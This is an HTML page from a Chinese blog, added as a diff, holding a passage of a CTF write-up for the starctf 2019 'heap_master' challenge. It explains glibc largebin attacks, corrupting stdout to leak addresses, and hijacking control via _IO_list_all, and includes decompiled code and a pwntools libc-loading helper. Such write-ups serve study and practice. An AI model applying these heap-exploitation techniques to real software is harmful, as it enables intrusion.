@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="n74fzVGuzCcR7QhYWu-qaPH7lKOjZC3b3tDU0egKMNA" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,largebin attack,_IO_list_all,_dl_open_hook," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="starctf-heap_master题解这题在比赛中没有解出来，赛后对着网上的writeup调了一遍，主要是ROIS和官方的这两篇，学习了一波！相关的文件可以在点击这里下载 题目信息程序在初始化的时候mmap了一段地址随机且大小为0x10000的内存，之后所有的操作都是基于在这段内存上进行的。 程序给用户提供了如下功能1234puts(&quot;=== Heap Master ===&quot;);puts(&quot;1">
+<meta name="keywords" content="pwn,largebin attack,_IO_list_all,_dl_open_hook">
+<meta property="og:type" content="article">
+<meta property="og:title" content="starctf-heap_master题解">
+<meta property="og:url" content="https://e3pem.github.io/2019/07/08/starctf2019/starctf-heap_master题解/index.html">
+<meta property="og:site_name" content="e3pem&#39;s Blog">
+<meta property="og:description" content="starctf-heap_master题解这题在比赛中没有解出来，赛后对着网上的writeup调了一遍，主要是ROIS和官方的这两篇，学习了一波！相关的文件可以在点击这里下载 题目信息程序在初始化的时候mmap了一段地址随机且大小为0x10000的内存，之后所有的操作都是基于在这段内存上进行的。 程序给用户提供了如下功能1234puts(&quot;=== Heap Master ===&quot;);puts(&quot;1">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190510114141.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190510141535.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190510161752.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190510161958.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190510162631.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190510163127.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190511134208.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190511134545.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190511164133.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190511164556.png">
+<meta property="og:updated_time" content="2019-05-11T09:31:15.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="starctf-heap_master题解">
+<meta name="twitter:description" content="starctf-heap_master题解这题在比赛中没有解出来，赛后对着网上的writeup调了一遍，主要是ROIS和官方的这两篇，学习了一波！相关的文件可以在点击这里下载 题目信息程序在初始化的时候mmap了一段地址随机且大小为0x10000的内存，之后所有的操作都是基于在这段内存上进行的。 程序给用户提供了如下功能1234puts(&quot;=== Heap Master ===&quot;);puts(&quot;1">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190510114141.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://e3pem.github.io/2019/07/08/starctf2019/starctf-heap_master题解/"/>
+
+
+
+
+
+  <title>starctf-heap_master题解 | e3pem's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">e3pem's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://e3pem.github.io/2019/07/08/starctf2019/starctf-heap_master题解/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="e3pem">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="e3pem's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">starctf-heap_master题解</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-08T23:33:38+08:00">
+                2019-07-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="starctf-heap-master题解"><a href="#starctf-heap-master题解" class="headerlink" title="starctf-heap_master题解"></a>starctf-heap_master题解</h1><p>这题在比赛中没有解出来，赛后对着网上的writeup调了一遍，主要是<a href="https://xz.aliyun.com/t/5006" target="_blank" rel="noopener">ROIS</a>和<a href="https://github.com/sixstars/starctf2019/tree/master/pwn-heap_master" target="_blank" rel="noopener">官方</a>的这两篇，学习了一波！相关的文件可以在<a href="https://github.com/e3pem/CTF/tree/master/starctf2019/heap_master" target="_blank" rel="noopener">点击这里</a>下载</p>
+<h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p>程序在初始化的时候<code>mmap</code>了一段地址随机且大小为<code>0x10000</code>的内存，之后所有的操作都是基于在这段内存上进行的。</p>
+<p>程序给用户提供了如下功能<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"=== Heap Master ==="</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"1. Malloc"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"2. Edit"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"3. Free"</span>);</span><br></pre></td></tr></table></figure></p>
+<p>分配功能只是调用了<code>malloc</code>函数来分配用户指定大小的内存，然而分配的这块内存的指针没有保存，并且在其他操作中也没有使用。相当于只是分配了内存，并不能使用分配出来的这块内存。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 size; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"size: "</span>);</span><br><span class="line">  size = read_num();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">malloc</span>(size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>释放功能要求用户输入偏移，该偏移是基于<code>mmap</code>出来的那块内存的，相当于用户只能释放处于初始化时<code>mmap</code>出来的那块内存范围内的指针<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"offset: "</span>);</span><br><span class="line">  v0 = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0xFFFF</span> )</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">char</span> *)heap_base + v0);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invaild input"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>编辑功能允许用户在<code>mmap</code>出来的内存中进行任意的编辑（<strong>只能在mmap出来的内存中编辑</strong>）<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"offset: "</span>);</span><br><span class="line">  v2 = read_num();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"size: "</span>);</span><br><span class="line">  v3 = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xFFFF</span> || v3 &gt; <span class="number">0x10000</span> || v2 + v3 &gt; <span class="number">0x10000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invaild input"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"content: "</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; i += result )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    result = read(<span class="number">0</span>, (<span class="keyword">char</span> *)heap_base + v2, v3 - i);</span><br><span class="line">    <span class="keyword">if</span> ( result &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="面临的问题"><a href="#面临的问题" class="headerlink" title="面临的问题"></a>面临的问题</h2><ol>
+<li>程序没有输出功能，要想办法进行地址泄露</li>
+<li>即使成功泄漏后，由于只能在<code>mmap</code>处的内存进行编辑，所以很难实现任意地质写，导致控制程序的执行困难</li>
+</ol>
+<p>对于没有泄露的题，一般的思路就是通过修改<code>stdout</code>结构体来让程序自己输出地址信息，这种思路在hitconctf里面的<code>babytcache</code>中出现过<a href="https://e3pem.github.io/2018/12/04/hitcon/baby_tcache/">参考这里</a>。要通过这种方式进行泄露，需要修改<code>stdout</code>结构体中的两个字段，分别是:<code>flag</code>和<code>_IO_write_base</code>。</p>
+<p>在比赛的过程中，始终没有想到通过怎样的方式能够修改两个字段，同时也没有注意到<code>flag</code>字段只需要满足<code>f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1</code>以及<code>f-&gt;write_base != f-&gt;write_ptr</code>时就会造成信息泄露（之前以为需要将flag字段设置为固定的<code>0xfbad1800</code>才可以）。</p>
+<p>对于后面控制程序执行的方式，从wp里面学到了两种方法，分别是：</p>
+<ul>
+<li>覆盖<code>_IO_list_all</code>来控制</li>
+<li>覆盖<code>_dl_open_hook</code>来控制</li>
+</ul>
+<h2 id="加载指定版本的libc"><a href="#加载指定版本的libc" class="headerlink" title="加载指定版本的libc"></a>加载指定版本的libc</h2><p>题目给出的libc版本为2.25版本，目前已知的查看libc版本的方式有：</p>
+<ul>
+<li>直接运行该libc，<code>./libc.so.6</code></li>
+<li>使用strings并过滤<code>GNU C Library</code>来查看</li>
+<li>通过libc中指定函数的偏移并结合<a href="https://libc.blukat.me/" target="_blank" rel="noopener">该网站</a>来查询</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">heapmaster$ strings libc.so.6 | grep <span class="string">"GNU C Library"</span></span><br><span class="line">GNU C Library (Debian GLIBC 2.25-6) stable release version 2.25, by Roland McGrath et al.</span><br></pre></td></tr></table></figure>
+<p>为了能够在本地加载该版本的libc进行调试，在<a href="https://bbs.pediy.com/thread-225849.htm" target="_blank" rel="noopener">这里</a>找到了一个用来加载指定libc版本的脚本，需要有<code>ld.so</code>库的情况下才可以</p>
+<p><em>在知道libc版本但题目没有给出ld.so库的情况下可以去下载对应版本的ld.so库</em></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_ld</span><span class="params">(binary, ld)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Force to use assigned new ld.so by changing the binary</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.access(ld, os.R_OK): </span><br><span class="line">        log.failure(<span class="string">"Invalid path &#123;&#125; to ld"</span>.format(ld))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"> </span><br><span class="line">         </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(binary, ELF):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.access(binary, os.R_OK): </span><br><span class="line">            log.failure(<span class="string">"Invalid path &#123;&#125; to binary"</span>.format(binary))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        binary = ELF(binary)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> segment <span class="keyword">in</span> binary.segments:</span><br><span class="line">        <span class="keyword">if</span> segment.header[<span class="string">'p_type'</span>] == <span class="string">'PT_INTERP'</span>:</span><br><span class="line">            size = segment.header[<span class="string">'p_memsz'</span>]</span><br><span class="line">            addr = segment.header[<span class="string">'p_paddr'</span>]</span><br><span class="line">            data = segment.data()</span><br><span class="line">            <span class="keyword">if</span> size &lt;= len(ld):</span><br><span class="line">                log.failure(<span class="string">"Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;"</span>.format(data, ld))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">            binary.write(addr, ld.ljust(size, <span class="string">'\0'</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.access(<span class="string">'/tmp/pwn'</span>, os.F_OK): os.mkdir(<span class="string">'/tmp/pwn'</span>)</span><br><span class="line">            path = <span class="string">'/tmp/pwn/&#123;&#125;_debug'</span>.format(os.path.basename(binary.path))</span><br><span class="line">            <span class="keyword">if</span> os.access(path, os.F_OK): </span><br><span class="line">                os.remove(path)</span><br><span class="line">                info(<span class="string">"Removing exist file &#123;&#125;"</span>.format(path))</span><br><span class="line">            binary.save(path)    </span><br><span class="line">            os.chmod(path, <span class="number">0b111000000</span>) <span class="comment">#rwx------</span></span><br><span class="line">    success(<span class="string">"PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;"</span>.format(data, ld, path)) </span><br><span class="line">    <span class="keyword">return</span> ELF(path)</span><br><span class="line"><span class="comment"># example</span></span><br><span class="line">elf = change_ld(<span class="string">'./heap_master'</span>, <span class="string">'./ld-linux-x86-64.so.2'</span>)</span><br><span class="line">p = elf.process(env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</span><br></pre></td></tr></table></figure>
+<p>现在就能够加载程序提供版本的libc进行调试了，不过这种方式启动的程序是无法查看堆的内容的~，所以<code>largebin attack</code>部分需要先用本地的libc进行调试，燃面的部分则用给出的libc调试。</p>
+<h2 id="largebin-attack-实现信息泄露"><a href="#largebin-attack-实现信息泄露" class="headerlink" title="largebin attack 实现信息泄露"></a>largebin attack 实现信息泄露</h2><p>前面提到，要通过<code>stdout</code>实现泄露，需要修改两个字段，如何实现呢？可以通过<code>largebin attack</code>来实现。</p>
+<h3 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h3><p>这里对<code>largebin attack</code>的原理以及能达到的效果进行介绍，详细的介绍请参考<a href="https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">这篇文章</a></p>
+<p><code>largebin attack</code>的原理主要是利用了属于<code>largebin</code>范围内的chunk在从<code>unsorted bin</code>取出并链入<code>largebin</code>过程中的弱检查来实现往任意地址写入堆地址的目的。</p>
+<p><code>largebin attack</code>需要的条件是要求攻击者能够控制已经放入<code>largebin</code>中的chunk的<code>bk</code>和<code>bk_nextsize</code>字段</p>
+<p>largebin中的chunk是怎么组织的？看了好久的源码才理解</p>
+<ul>
+<li>由于largebin中不同的bin链表之间的距离不再像smallbin中那样是固定的0x10字节(64位)，而是把chunk大小在某一个范围内的都放在同一个largebin里面。在这种情况下，为了提升查找满足条件的chunk的速度，在原来的<code>smallbin</code>中通过<code>fd、bk</code>来组织链表的基础上增加了通过<code>fd_nextsize、bk_nextsize</code>来组织链表。</li>
+<li>同一个largebin中的chunk通过<code>fd、bk</code>字段完整的链接成一个双链表，这和smallbin中是一致的。而大小不同的chunk则是通过<code>fd_nextsize、bk_nextsize</code>又组成了一个链表，这个链表是按照chunk的大小来排列的</li>
+<li>当chunk要插入到largebin时，根据chunk的大小来判断应该插入到<code>fd_nextsize、bk_nextsize</code>组成的双链表的哪一个位置。<code>fd_nextsize</code>指向的是比当前chunk更小的chunk的地址，只需要一直遍历下去，就一定能够找到一个比待插入的chunk小的chunk</li>
+<li>如果待插入的chunk和某一个chunk大小相等，那么便不会把它链入到<code>fd_nextsize、bk_nextsize</code>组成的链表，但是会链入到<code>fd、bk</code>组成的链表中</li>
+</ul>
+<p>举个例子（仅从<code>fd</code>和<code>fd_nextsize</code>来考虑）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">当前largebin：</span><br><span class="line">A--&gt;B--&gt;C--&gt;D（其中A&gt;B&gt;C&gt;D）</span><br><span class="line">则fd链表如下：</span><br><span class="line">A--&gt;B--&gt;C--&gt;D</span><br><span class="line">fd_nextsize链表如下：</span><br><span class="line">A--&gt;B--&gt;C--&gt;D</span><br><span class="line"></span><br><span class="line">此时要插入E，且C&lt;E&lt;B</span><br><span class="line">则插入后，fd链表如下:</span><br><span class="line">A--&gt;B--&gt;E--&gt;C--&gt;D</span><br><span class="line">fd_nextsize链表如下：</span><br><span class="line">A--&gt;B--&gt;E--&gt;C--&gt;D</span><br><span class="line"></span><br><span class="line">此时再插入B1，且B1=B</span><br><span class="line">则插入后，fd链表如下:</span><br><span class="line">A--&gt;B--&gt;B1--&gt;E--&gt;C--&gt;D</span><br><span class="line">fd_nextsize链表如下：</span><br><span class="line">A--&gt;B--&gt;E--&gt;C--&gt;D</span><br></pre></td></tr></table></figure></p>
+<p>将chunk放入到largebin中的代码主要是下面这部分（<a href="https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">图片来源于这里</a>）</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190510114141.png" alt=""></p>
+<p>可以看到，如果能够控制已经在<code>largebin</code>中的chunk的<code>bk、bk_nextsize</code>字段，那么就能实现往任意地址写入待插入<code>largebin</code>的chunk的地址。一般待插入的chunk地址为堆地址，所以通过<code>largebin attack</code>可以实现往任意地址写入堆地址的目的</p>
+<p>而因为堆地址高字节在开了随机化以后可能为0x55和0x56，当为0x56时，这个值可以作为一个chunk的size字段(0x56对应的<code>NON_MAIN_ARENA</code>为1)，在写入字段后，<code>unsorted bin</code>的循环还没有结束，如果攻击者还能控制<code>unsorted bin</code>的<code>bk</code>字段，那么把这个bk字段设置为刚刚写入0x56的地址（调整一下偏移），如果申请的chunk大小刚好是0x40，那么这个chunk的大小刚好满足条件，就会被申请出来，进而造成任意地址写</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">  &#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">      victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="修改stdout实现泄露"><a href="#修改stdout实现泄露" class="headerlink" title="修改stdout实现泄露"></a>修改stdout实现泄露</h3><p>通过<code>largebin attack</code>，我们可以往任意地址处写入待插入larbin的chunk的地址，这里就是<code>mmap</code>出来的内存。而且一次<code>largebin attack</code>可以实现往两个地址处写入堆地址。</p>
+<p>同时还需要实现覆盖<code>stdout-&gt;flag</code>字段使其满足<code>f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1</code>，其中<code>flag &amp; 0xa00 != NULL</code>可以通过控制释放的chunk的偏移来实现，<code>flag &amp; 0x1000 == 1</code>则可以利用<code>mmap</code>出来的内存地址的随机性来满足。</p>
+<p>为了让<code>stdout-&gt;_IO_write_base!=_IO_write_ptr</code>，可以在覆盖<code>_IO_write_base</code>的时候进行错位，覆盖前一个字段的高7字节和该字段的最低字节，这样就能将<code>stdout</code>结构体的整个内容输出出来（包括mmap内存的地址）</p>
+<p>下图就是在本地环境下泄露出来的信息：</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190510141535.png" alt=""></p>
+<h2 id="通过-IO-list-all控制程序执行"><a href="#通过-IO-list-all控制程序执行" class="headerlink" title="通过_IO_list_all控制程序执行"></a>通过_IO_list_all控制程序执行</h2><p>有了堆地址和libc地址后，下一个面临的问题就是如何控制程序的执行。无法通过常规的修改<code>__malloc_hook</code>等地方获取shell，同时题目进行了chroot只能通过执行ROP的方式来读取flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot --userspec=pwn:pwn ./ ./heap_master</span><br></pre></td></tr></table></figure></p>
+<p>接下来分析一下是如何通过覆盖<code>_IO_list_all</code>来劫持程序栈到堆上的</p>
+<p>首先，再次利用<code>largebin attack</code>，把<code>_IO_list_all</code>的值覆盖为我们可控的<code>mmap</code>出来的堆地址；然后在堆上布置好数据以及<code>ROP</code>链；当程序执行<code>exit()</code>函数的时候会执行<code>_IO_flush_all_lockp</code>，经过<code>fflush</code>获取<code>_IO_list_all</code>的值并取出作为<code>_IO_FILE_plus</code>调用其中的<code>_IO_str_overflow</code></p>
